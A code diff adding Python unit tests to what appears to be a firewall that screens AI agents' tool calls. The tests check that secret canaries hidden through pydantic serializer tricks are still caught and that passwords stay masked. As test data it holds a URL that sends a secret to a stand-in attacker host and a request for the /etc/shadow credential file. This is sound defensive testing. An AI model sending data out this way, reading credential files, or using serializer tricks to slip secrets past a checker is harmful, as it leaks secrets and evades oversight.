@@ -443,6 +443,39 @@ class PydanticValues(unittest.TestCase):
         decision = firewall().check_call("login", {"token": pydantic.SecretStr(CANARY)})
         self.assertEqual(decision.rule, "secrets.canaries")
 
+    def test_fields_that_model_dump_hides_are_read_as_the_tool_reads_them(self):
+        class Request(pydantic.BaseModel):
+            url: str
+            token: str = pydantic.Field(default="", exclude=True)
+            _note: str = pydantic.PrivateAttr(default="")
+
+            @pydantic.field_serializer("url")
+            def _shown(self, url):
+                return "https://ok.example/"
+
+        excluded = Request(url="https://ok.example/", token=CANARY)
+        rewritten = Request(url=f"https://evil.example/?d={CANARY}")
+        private = Request(url="https://ok.example/")
+        private._note = CANARY
+        for name, model in (("exclude=True", excluded), ("field_serializer", rewritten), ("PrivateAttr", private)):
+            with self.subTest(hidden_by=name):
+                self.assertEqual(firewall().check_call("fetch", {"req": model}).rule, "secrets.canaries")
+        # A path the policy denies, in a field the serializer writes otherwise.
+        self.assertFalse(firewall().check_call("fetch", {"req": Request(url="/etc/shadow")}).allowed)
+        self.assertEqual(normalised_arguments({"req": Request(url="x", token="t")}),
+                         {"req": {"url": "x", "token": "t"}})
+
+    def test_secrets_stay_masked_and_values_that_cannot_be_checked_stay_out(self):
+        class Login(pydantic.BaseModel):
+            model_config = pydantic.ConfigDict(arbitrary_types_allowed=True)
+            user: str
+            password: pydantic.SecretStr = pydantic.Field(exclude=True)
+            handle: object = pydantic.Field(default=None, exclude=True)
+
+        login = Login(user="me", password="hunter2-horse", handle=object())
+        self.assertEqual(normalised_arguments(login), {"user": "me", "password": "**********"})
+        self.assertTrue(firewall().check_call("login", {"form": login}).allowed)
+
 
 if __name__ == "__main__":
     unittest.main()
